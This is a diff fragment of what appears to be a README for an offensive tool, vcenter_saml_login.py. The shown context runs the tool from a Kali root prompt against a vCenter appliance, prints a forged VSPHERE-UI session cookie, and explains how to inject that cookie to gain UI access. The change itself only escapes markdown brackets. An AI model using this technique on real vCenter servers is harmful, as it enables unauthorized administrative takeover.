@@ -26,7 +26,7 @@ root@kali:~/vcenter# python3 vcenter_saml_login.py -p data.mdb -t 10.0.100.200
 [+] Cookie: VSPHERE-UI-JSESSIONID=06D1630719B4DE33A4CE653458911640
 ```
 
-With the above cookie, visit the VCSA instance at https://<VCSA>/ui, add the cookie under the /ui path, and re-browse to https://<VCSA>/ui. 
+With the above cookie, visit the VCSA instance at https://\<VCSA>\/ui, add the cookie under the /ui path, and re-browse to https://\<VCSA\>/ui. 
 
 ## Demonstration
 ![](vcenter.gif)
